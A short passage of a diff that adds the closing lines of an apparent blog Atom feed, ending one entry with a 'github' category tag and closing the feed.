+href=&quot;ht</summary>
+      
+    
+    
+    
+    
+    <category term="github" scheme="https://blog.oopsky.top/tags/github/"/>
+    
+  </entry>
+  
+</feed>
